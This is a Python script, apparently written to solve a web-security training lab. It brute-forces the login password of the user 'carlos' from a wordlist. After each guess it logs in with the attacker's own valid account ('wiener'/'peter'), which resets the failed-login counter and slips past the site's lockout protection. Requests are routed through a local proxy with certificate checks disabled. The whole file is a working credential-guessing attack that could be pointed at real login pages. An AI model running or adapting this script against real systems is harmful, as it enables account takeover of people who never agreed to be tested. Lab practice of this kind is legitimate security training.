import requests
import sys
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8087", "https": "http://127.0.0.1:8087"}

def brute_force(url, passList) :

    credentials = ""

    for i in range(len(passList)):
        pass_ = passList[i]
        data = {"username": "carlos", "password": pass_}
        cookie = {"session":"lzexEbFoIoZ62zcQMozQ3OhvywyK3H1F"}
        res = requests.post(url + "/login", data=data, cookies=cookie, proxies=proxies, verify=False)

        if "Incorrect password" not in res.text or res.status_code == 302 :
            credentials += pass_ + "\n"
            break
        
        # pass_ = passList[i+1]
        # data = {"username": "carlos", "password": pass_}
        # res = requests.post(url + "/login", data=data, cookies=cookie, proxies=proxies, verify=False)

        # if "Incorrect password" not in res.text :
        #     credentials += pass_ + "\n"
        #     break
        
        data = {"username": "wiener", "password": "peter"}
        requests.post(url + "/login", data=data, cookies=cookie, proxies=proxies, verify=False)
        # requests.get(url+"/logout", cookies=cookie, proxies=proxies, verify=False)
         
    return credentials          

if __name__ == "__main__":
    
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('(+) Usage : %s <url>' % sys.argv[0])
        print('(+) Example : %s www.example.com' % sys.argv[0])
        sys.exit(-1)
        
    passList = []
    
    with open(r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\password.txt', "r", encoding="utf-8") as passFile:
        passList = passFile.read().splitlines()
        passFile.close()
        
    result = brute_force(url, passList)
    
    print("The result is : ", end="\n")
    print(result)